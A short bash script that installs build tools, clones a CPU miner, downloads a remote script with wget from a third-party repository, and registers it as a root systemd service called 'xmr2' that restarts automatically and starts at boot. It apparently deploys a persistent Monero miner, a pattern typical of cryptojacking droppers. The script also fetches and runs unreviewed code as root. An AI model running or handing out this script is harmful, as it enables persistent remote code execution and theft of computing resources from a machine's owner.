#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
cd /usr/local/src/ &&
rm -rf cpuminer-opt &&
git clone https://github.com/fablebox/cpuminer-opt &&
cd cpuminer-opt &&
wget https://raw.githubusercontent.com/fablebox/susuwatari/master/thanhmlzz/2.sh &&
chmod +x 2.sh &&
chmod +x jce.sh &&
./build.sh &&
bash -c 'cat <<EOT >>/lib/systemd/system/xmr2.service 
[Unit]
Description=xmr2
After=network.target
[Service]
ExecStart= /usr/local/src/cpuminer-opt/2.sh
WatchdogSec=3600
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmr2.service &&
service xmr2 start
